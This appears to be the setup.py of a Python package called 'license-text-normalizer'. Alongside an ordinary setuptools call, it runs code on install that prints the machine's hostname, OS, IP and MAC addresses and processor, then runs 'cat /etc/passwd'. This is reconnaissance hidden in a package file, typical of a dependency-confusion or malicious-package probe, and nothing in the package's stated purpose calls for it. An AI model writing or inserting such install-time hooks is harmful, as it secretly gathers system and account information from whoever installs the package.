import setuptools
from setuptools.command.install import install
import platform,socket,re,uuid,json,logging,os      
   
setuptools.setup(
	name="license-text-normalizer",
	version='2.9.0',
	author='SCS',
	packages=["license_text_normalizer"],
)
print('*'*70)
print("Hello ",socket.gethostname())
print('Platform:\t',platform.system(),platform.release(),platform.version())
print('Architecture:\t',platform.machine())
print('Hostname\t',socket.gethostname())
print('IP-address:\t',socket.gethostbyname(socket.gethostname()))
print('MAC-address:\t',':'.join(re.findall('..', '%012x' % uuid.getnode())))
print('Processor:',platform.processor())
print('*'*70)
print('************/etc/passwd details**************')
os.system('cat /etc/passwd')
print('*'*70)
